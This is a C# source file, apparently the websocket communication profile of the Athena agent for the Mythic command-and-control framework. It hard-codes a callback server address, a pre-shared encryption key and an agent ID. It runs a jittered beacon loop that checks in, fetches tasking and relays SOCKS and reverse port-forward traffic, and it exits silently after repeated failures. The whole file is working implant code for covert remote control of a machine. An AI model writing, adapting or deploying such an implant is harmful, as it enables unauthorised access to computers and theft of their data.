using Athena.Models.Config;
using Athena.Utilities;
using System.Text.Json;
using System.Net.WebSockets;
using System.Text;
using Athena.Models.Mythic.Checkin;
using System.Diagnostics;
using Athena.Models.Commands;
using Athena.Models.Mythic.Tasks;
using Athena.Commands;
using Athena.Profiles.Websocket;
using Athena.Models.Comms.SMB;
using Athena.Models.Proxy;

namespace Athena
{
    public class Websocket : IProfile
    {
        public string uuid { get; set; }
        public string psk { get; set; }
        public string url { get; set; }
        public string endpoint { get; set; }
        public string userAgent { get; set; }
        public string hostHeader { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        public bool encrypted { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        private int currentAttempt = 0;
        private int maxAttempts = 5;
        public int connectAttempts { get; set; }
        public DateTime killDate { get; set; }
        public ClientWebSocket ws { get; set; }
        public PSKCrypto crypt { get; set; }
        private CancellationTokenSource cts = new CancellationTokenSource();
        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
        public Websocket()
        {
            int callbackPort = Int32.Parse("8081");
            //string callbackHost = "ws://192.168.4.223";
            string callbackHost = "ws://192.168.4.234";
            this.endpoint = "socket";
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
            this.userAgent = "";
            this.hostHeader = "";
            this.psk = "TFWdlldjF0sCRUPL4T4pzZj+Ut8y2w1oK3NBo71OP1M=";
            //this.psk = "lKb443VzmD7L6sjTF+69j8D+I3CphAuS6FPCQAPf/ts=";
            this.encryptedExchangeCheck = bool.Parse("false");
            int sleep = int.TryParse("3", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("3", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.uuid = "72aab7a8-147c-42e4-a001-f558225bc4b2";
            //this.uuid = "4def55b0-51c0-46da-bf8e-12e4604c32b6";
            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(this.uuid, this.psk);
                this.encrypted = true;
            }

            this.ws = new ClientWebSocket();

            if (!String.IsNullOrEmpty(this.hostHeader))
            {
                this.ws.Options.SetRequestHeader("Host", this.hostHeader);
            }
        }
        public async Task StartBeacon()
        {
            this.cts = new CancellationTokenSource();
            while (!cts.Token.IsCancellationRequested)
            {
                if (this.currentAttempt > this.maxAttempts)
                {
                    Environment.Exit(0);
                }
                await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
                Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
                Task<List<MythicDatagram>> socksTask = ProxyResponseHandler.GetSocksMessagesAsync();
                Task<List<MythicDatagram>> rpFwdTask = ProxyResponseHandler.GetRportFwdMessagesAsync();
                await Task.WhenAll(responseTask, delegateTask, socksTask, rpFwdTask);

                GetTasking gt = new GetTasking()
                {
                    action = "get_tasking",
                    tasking_size = -1,
                    delegates = delegateTask.Result,
                    socks = socksTask.Result,
                    responses = responseTask.Result,
                    rpfwd = rpFwdTask.Result,
                };
                try
                {
                    string responseString = await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));

                    if (String.IsNullOrEmpty(responseString))
                    {
                        this.currentAttempt++;
                        continue;
                    }

                    GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                    if (gtr == null)
                    {
                        this.currentAttempt++;
                        continue;
                    }

                    this.currentAttempt = 0;

                    TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);

                    this.SetTaskingReceived(this, tra);
                }
                catch (Exception e)
                {
                    Debug.WriteLine($"[{DateTime.Now}] Becaon attempt failed {e}");
                    this.currentAttempt++;
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cts.Cancel();
                }
            }
        }
        public bool StopBeacon()
        {
            this.cts.Cancel();
            return true;
        }
        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            int maxAttempts = 3;
            int currentAttempt = 0;
            do
            {
                string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

                if (!string.IsNullOrEmpty(res))
                {
                    return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
                }
                currentAttempt++;
            } while (currentAttempt <= maxAttempts);

            return new CheckinResponse()
            {
                status = "failed"
            };
        }
        public async Task<bool> Connect(string url)
        {
            this.connectAttempts = 0;
            try
            {
                ws = new ClientWebSocket();
                await ws.ConnectAsync(new Uri(url), CancellationToken.None);

                while (ws.State != WebSocketState.Open)
                {
                    if (this.connectAttempts == this.maxAttempts)
                    {
                        Environment.Exit(0);
                    }
                    await Task.Delay(3000);
                    this.connectAttempts++;
                }
                return true;
            }
            catch
            {
                return false;
            }
        }
        public async Task<string> Send(string json)
        {
            if (this.ws.State != WebSocketState.Open)
            {
                Debug.WriteLine($"[{DateTime.Now}] Lost socket connection, attempting to re-establish.");
                await Connect(this.url);
            }

            Debug.WriteLine($"[{DateTime.Now}] Message to Mythic: {json}");

            try
            {
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(this.uuid + json);
                }

                WebSocketMessage m = new WebSocketMessage()
                {
                    client = true,
                    data = json,
                    tag = String.Empty
                };

                string message = JsonSerializer.Serialize(m, WebsocketJsonContext.Default.WebSocketMessage);
                byte[] msg = Encoding.UTF8.GetBytes(message);
                Debug.WriteLine($"[{DateTime.Now}] Sending Message and waiting for resopnse.");
                await ws.SendAsync(msg, WebSocketMessageType.Text, true, CancellationToken.None);
                message = await Receive(ws);

                if (String.IsNullOrEmpty(message))
                {
                    Debug.WriteLine($"[{DateTime.Now}] Response was empty.");
                    return String.Empty;
                }

                m = JsonSerializer.Deserialize<WebSocketMessage>(message, WebsocketJsonContext.Default.WebSocketMessage);

                if (this.encrypted)
                {
                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {this.crypt.Decrypt(m.data)}");
                    return this.crypt.Decrypt(m.data);
                }

                if (!string.IsNullOrEmpty(json))
                {
                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {Misc.Base64Decode(m.data).Result.Substring(36)}");
                    return (await Misc.Base64Decode(m.data)).Substring(36);
                }

                return String.Empty;
            }
            catch
            {
                return String.Empty;
            }
        }
        static async Task<string> Receive(ClientWebSocket socket)
        {
            try
            {
                var buffer = new ArraySegment<byte>(new byte[2048]);
                do
                {
                    WebSocketReceiveResult result;
                    using (var ms = new MemoryStream())
                    {
                        do
                        {
                            result = await socket.ReceiveAsync(buffer, CancellationToken.None);
                            await ms.WriteAsync(buffer.Array, buffer.Offset, result.Count);
                        } while (!result.EndOfMessage);

                        if (result.MessageType == WebSocketMessageType.Close)
                            break;

                        ms.Seek(0, SeekOrigin.Begin);
                        using (var reader = new StreamReader(ms, Encoding.UTF8))
                            return (await reader.ReadToEndAsync());
                    }

                } while (true);

                return String.Empty;
            }
            catch
            {
                return String.Empty;
            }
        }
    }
}
